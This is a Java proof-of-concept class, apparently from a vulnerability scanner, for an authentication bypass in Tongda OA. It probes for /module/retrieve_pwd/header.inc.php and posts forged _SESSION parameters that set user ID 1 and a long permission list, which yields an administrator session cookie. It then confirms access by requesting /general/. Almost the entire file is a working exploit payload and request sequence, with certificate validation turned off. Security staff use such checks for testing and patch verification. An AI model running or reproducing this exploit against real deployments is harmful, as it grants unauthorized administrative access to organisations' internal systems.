package poc;

import com.github.kevinsawicki.http.HttpRequest;
import org.jsoup.Connection;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

import java.io.IOException;

public class TongdaOA_BypassAuth {
    public String url;  //通达OAurl
    public String path; //通达OA漏洞目录path
    public String cookie;//cookie


    public String getUrl() {
        return url;
    }

    public void setUrl(String url) {
        this.url = url;
    }

    public String getPath() {
        return path;
    }

    public void setPath(String path) {
        this.path = path;
    }

    public String getCookie() {
        return cookie;
    }

    public void setCookie(String cookie) {
        this.cookie = cookie;
    }

    public boolean POC(){
        //判断漏洞目录是否存在
        path = "/module/retrieve_pwd/header.inc.php";
        HttpRequest pathRequest = HttpRequest.get(url+path)
                .trustAllCerts()
                .trustAllHosts();
        if(pathRequest.code()!=200){
           return false;
        }else {
            //获取cookie
            HttpRequest getCookieRequest=HttpRequest.post(url+path)
                    .trustAllCerts()
                    .trustAllHosts()
                    .send("_SESSION[LOGIN_THEME]=15&_SESSION[LOGIN_USER_ID]=1&_SESSION[LOGIN_UID]=1&_SESSION[LOGIN_FUNC_STR]=1,3,42,643,644,634,4,147,148,7,8,9,10,16,11,130,5,131,132,256,229,182,183,194,637,134,37,135,136,226,253,254,255,536,24,196,105,119,80,96,97,98,114,126,179,607,539,251,127,238,128,85,86,87,88,89,137,138,222,90,91,92,152,93,94,95,118,237,108,109,110,112,51,53,54,153,217,150,239,240,218,219,43,17,18,19,15,36,70,76,77,115,116,185,235,535,59,133,64,257,2,74,12,68,66,67,13,14,40,41,44,75,27,60,61,481,482,483,484,485,486,487,488,489,490,491,492,120,494,495,496,497,498,499,500,501,502,503,505,504,26,506,507,508,515,537,122,123,124,628,125,630,631,632,633,55,514,509,29,28,129,510,511,224,39,512,513,252,230,231,232,629,233,234,461,462,463,464,465,466,467,468,469,470,471,472,473,474,475,200,202,201,203,204,205,206,207,208,209,65,187,186,188,189,190,191,606,192,193,221,550,551,73,62,63,34,532,548,640,641,642,549,601,600,602,603,604,46,21,22,227,56,30,31,33,32,605,57,609,103,146,107,197,228,58,538,151,6,534,69,71,72,223,639,");
            cookie=getCookieRequest.header("Set-Cookie");

            path="/general/";
            Document document = null;
            try {
                document = Jsoup.connect(url + path).ignoreHttpErrors(true).header("Cookie",cookie).get();
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
            if (document.title().equals("用户未登录")){
                return false;
            }else {
                return true;
            }
        }
    }
}
